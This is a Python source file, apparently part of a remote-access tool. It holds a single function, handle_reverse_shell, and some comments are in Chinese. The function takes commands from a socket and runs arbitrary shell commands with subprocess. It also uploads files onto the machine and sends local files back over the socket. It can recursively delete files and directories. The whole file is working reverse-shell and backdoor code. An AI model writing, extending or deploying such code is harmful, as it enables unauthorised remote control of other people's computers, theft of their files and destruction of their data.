import os
import shutil
import threading
import ctypes
import struct
import subprocess
import socket
from time import sleep


def handle_reverse_shell(client_socket):
    while True:
        try:
            cmd_rece = client_socket.recv(1024).decode()
            print(cmd_rece)
        except socket.timeout:
            print("Timeout waiting for command, returning to prompt.")
            continue

        if cmd_rece == "exit":
            break  # Exit the reverse shell loop
        elif cmd_rece[:2] == "up":
            print("up")
            cmd_list = cmd_rece.split(" ")
            data = b""

            while True:
                end_data = client_socket.recv(1024)
                if end_data == b"Ended":  # 如果收到結束符號
                    break
                data += end_data  # 將每次收到的資料添加到data中

            # 寫入檔案
            new_file = open(cmd_list[2], "wb")
            new_file.write(data)
            new_file.close()

            # 回傳確認訊息
            client_socket.send("Upload True :)".encode())
        elif cmd_rece[:2] == "cd":
            try:
                os.chdir(cmd_rece[3:])
                client_socket.send(os.getcwd().encode())
                print(os.getcwd())
            except FileNotFoundError:
                client_socket.send(b"Directory not found")
            except Exception as e:
                client_socket.send(f"Error: {str(e)}".encode())
        elif cmd_rece[:6] == "mkdir ":
            dir_name = cmd_rece[6:]
            try:
                os.makedirs(dir_name)
                client_socket.send(b"Directory created")
            except FileExistsError:
                client_socket.send(b"Directory already exists")
            except Exception as e:
                client_socket.send(f"Error: {str(e)}".encode())
        elif cmd_rece[:3] == "rm ":
            path = cmd_rece[3:]
            try:
                if os.path.isfile(path):
                    os.remove(path)
                    client_socket.send(b"File deleted")
                elif os.path.isdir(path):
                    shutil.rmtree(path)
                    client_socket.send(b"Directory removed")
                else:
                    client_socket.send(b"Path not found")
            except PermissionError:
                client_socket.send(b"Permission denied")
            except Exception as e:
                client_socket.send(f"Error: {str(e)}".encode())
        elif cmd_rece[:6] == "touch ":
            file_path = cmd_rece[6:]
            try:
                with open(file_path, 'a'):
                    os.utime(file_path, None)  # Update file timestamp if it already exists
                client_socket.send(b"File created")
            except Exception as e:
                client_socket.send(f"Error: {str(e)}".encode())
        elif cmd_rece[:4].strip() == "down":
            file_path = cmd_rece[5:]
            file_path = open(file_path,"rb")
            data = file_path.read()
            file_path.close()

            while True:
                if len(data) > 0:
                    temp_data = data[:1024]
                    if len(temp_data) < 1024:
                        temp_data += chr(0).encode() * (1024 -len(temp_data))
                    
                    data = data[1024:]

                    client_socket.send(temp_data)
                else:
                    client_socket.send("Ended".encode())
                    sleep(0.5)
                    break
            client_socket.send("Download True :)".encode())
        else:
            try:
                out_put = subprocess.getoutput(cmd_rece)
                if not out_put:
                    out_put = "error"
                client_socket.send(out_put.encode())
            except Exception as e:
                client_socket.send(f"Error: {str(e)}".encode())
